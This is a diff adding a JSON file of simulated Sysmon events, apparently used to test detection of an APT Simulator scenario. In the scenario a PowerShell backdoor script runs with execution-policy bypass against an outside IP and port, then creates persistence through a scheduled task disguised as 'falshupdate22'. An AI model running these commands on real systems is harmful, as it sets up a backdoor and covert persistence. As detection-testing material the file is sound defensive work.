@@ -1,0 +1,70 @@
+{
+	"name": "APTsimulator schtasks-xml",
+	"version": "0.1",
+	"author": "n0dec",
+	"description": "APTsimulator schtasks-xml events.",
+	"rules": {
+		"drop_file": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "File created",
+			"description": "Writing powershell script.",
+			"payload": {
+				"Image": "C:\\Users\\Administrator\\Downloads\\APTSimulator_pw_apt\\APTSimulator\\helpers\\7z.exe",
+				"TargetFilename": "C:\\TMP\\schtasks-backdoor.ps1"
+			}
+		},
+		"powershell_file": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Process Create",
+			"description": "Executing powershell script.",
+			"payload": {
+				"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+				"CommandLine": "powershell.exe  -Exec ByPasS \". C:\\TMP\\schtasks-backdoor.ps1;Invoke-Tasksbackdoor -method cmd -ip 8.8.8.8 -port 9999 -time 2\""
+			}
+		},
+		"xml_file": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "File created",
+			"description": "Writing xml file.",
+			"payload": {
+				"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+				"TargetFilename": "C:\\Users\\Administrator\\AppData\\Local\\Temp\\2\\wscript2.xml"
+			}
+		},
+		"cmd_schtasks": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Process Create",
+			"description": "Executing schtasks command.",
+			"payload": {
+				"ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+				"Image": "C:\\Windows\\System32\\cmd.exe",
+				"CommandLine": "\"C:\\Windows\\system32\\cmd.exe\" /C \"schtasks /create /xml C:\\\\Users\\\\ADMINI~1\\\\AppData\\\\Local\\\\Temp\\\\2\\\\wscript2.xml /tn falshupdate22\""
+			}
+		},
+		"schtasks": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Process Create",
+			"description": "Executing schtasks.",
+			"payload": {
+				"ParentImage": "C:\\Windows\\System32\\cmd.exe",
+				"Image": "C:\\Windows\\System32\\schtasks.exe",
+				"CommandLine": "schtasks  /create /xml C:\\\\Users\\\\ADMINI~1\\\\AppData\\\\Local\\\\Temp\\\\2\\\\wscript2.xml /tn falshupdate22"
+			}
+		},
+		"task_file": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "File created",
+			"description": "Writing task file.",
+			"payload": {
+				"Image": "C:\\Windows\\system32\\svchost.exe",
+				"TargetFilename": "C:\\Windows\\System32\\Tasks\\falshupdate22"
+			}
+		}
+	}
+}
